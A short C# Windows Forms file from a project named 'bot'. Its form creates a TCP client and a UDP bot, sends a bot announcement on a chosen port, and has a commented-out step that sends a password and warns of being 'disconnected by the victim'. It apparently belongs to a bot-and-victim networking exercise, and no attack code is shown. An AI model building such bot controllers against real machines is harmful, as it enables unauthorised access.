using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bot
{
    public partial class Form1 : Form
    {
        Client tcpClient;
        controller controller;
        UDPBot udpbot;
        public Form1()
        {
            InitializeComponent();
            tcpClient = new Client();
            udpbot = new UDPBot();
        }

        internal void UpdateMessageBox(string msg)
        {
            MessageBoxText.Text += msg + "\r\n";
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            /*
             int x = tcpClient.SendThePassword(PasswordTextBox.Text);
            if (x == -1)
            {
                DialogResult dialog = new DialogResult();

                dialog = MessageBox.Show("You were disconnected by the victim, do you wish to Exit?", "Alert!", MessageBoxButtons.YesNo);

                if (dialog == DialogResult.Yes)
                {
                    System.Environment.Exit(1);
                }
            }
            */
        }

        internal void setController(controller mController)
        {
            controller = mController;
            tcpClient.setController(mController);
            udpbot.setController(mController);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            udpbot.BotAnnouncment(PortTextBox.Text);
        }
    }
}
